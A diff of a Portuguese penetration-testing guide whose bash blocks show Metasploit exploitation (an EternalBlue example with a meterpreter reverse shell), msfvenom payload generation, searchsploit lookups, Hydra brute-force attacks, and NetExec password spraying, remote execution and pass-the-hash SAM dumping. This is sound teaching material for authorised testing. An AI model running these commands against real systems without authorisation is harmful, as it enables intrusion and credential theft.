@@ -27,27 +27,18 @@ Esta fase representa o ponto de transição entre a identificação teórica de 
 
 ```bash
 # Inicialização da console interativa principal (requer banco de dados ativo)
-
 msfconsole
 
 # Dentro da console: busca, seleção e configuração de um módulo de exploit
-
 search [termo_ou_cve]
-
 use [caminho/do/exploit]
-
 show options
-
 set RHOSTS [IP_do_alvo]
-
 set LHOST [IP_do_atacante]
-
 set PAYLOAD [caminho/do/payload]
-
 exploit
 
 # Geração de um payload standalone (reverse shell) via msfvenom para entrega manual
-
 msfvenom -p [payload] LHOST=[IP_atacante] LPORT=[porta] -f [formato_saida] -o [arquivo_saida]
 ```
 
@@ -57,15 +48,10 @@ msfvenom -p [payload] LHOST=[IP_atacante] LPORT=[porta] -f [formato_saida] -o [a
 
 ```bash
 msfconsole -q
-
 use exploit/windows/smb/ms17_010_eternalblue
-
 set RHOSTS 10.0.5.22
-
 set LHOST 10.0.5.100
-
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-
 exploit
 ```
 
@@ -84,19 +70,15 @@ exploit
 
 ```bash
 # Busca textual simples por um serviço, produto ou versão específica
-
 searchsploit [termo_de_busca]
 
 # Busca restrita a um identificador CVE específico
-
 searchsploit --cve [numero_do_cve]
 
 # Exibição do código-fonte completo do exploit diretamente no terminal
-
 searchsploit -x [caminho_do_exploit]
 
 # Cópia do exploit e de seus arquivos associados (mirror) para o diretório atual
-
 searchsploit -m [caminho_do_exploit]
 ```
 
@@ -106,7 +88,6 @@ searchsploit -m [caminho_do_exploit]
 
 ```bash
 searchsploit proftpd 1.3.5
-
 searchsploit -m unix/remote/36803.py
 ```
 
@@ -126,15 +107,12 @@ searchsploit -m unix/remote/36803.py
 
 ```bash
 # Ataque de dicionário contra um serviço SSH utilizando um usuário fixo e uma wordlist de senhas
-
 hydra -l [usuario] -P [wordlist_senhas.txt] [IP_do_alvo] ssh
 
 # Ataque combinando listas de usuários e senhas contra um serviço FTP, com paralelismo elevado
-
 hydra -L [usuarios.txt] -P [senhas.txt] -t 64 [IP_do_alvo] ftp
 
 # Ataque de força bruta contra um formulário de login web (HTTP POST), identificando a string de falha
-
 hydra -l [usuario] -P [wordlist_senhas.txt] [alvo.com] http-post-form "/login:usuario=^USER^&senha=^PASS^:F=Login invalido"
 ```
 
@@ -162,19 +140,15 @@ hydra -L usuarios_corporativos.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f 1
 
 ```bash
 # Validação de uma única credencial contra um bloco de rede via SMB, identificando hosts com admin local
-
 nxc smb [bloco_IP_ou_CIDR] -u [usuario] -p [senha]
 
 # Ataque de password spraying com uma lista de usuários contra uma única senha, sinalizando sucesso de admin
-
 nxc smb [bloco_IP_ou_CIDR] -u [usuarios.txt] -p [senha_unica] --continue-on-success
 
 # Execução remota de um comando em hosts autenticados com sucesso via SMB
-
 nxc smb [IP_do_alvo] -u [usuario] -p [senha] -x [comando_a_executar]
 
 # Extração remota do banco de credenciais SAM utilizando hash NTLM (pass-the-hash) em vez da senha
-
 nxc smb [IP_do_alvo] -u [usuario] -H [hash_ntlm] --sam
 ```
 
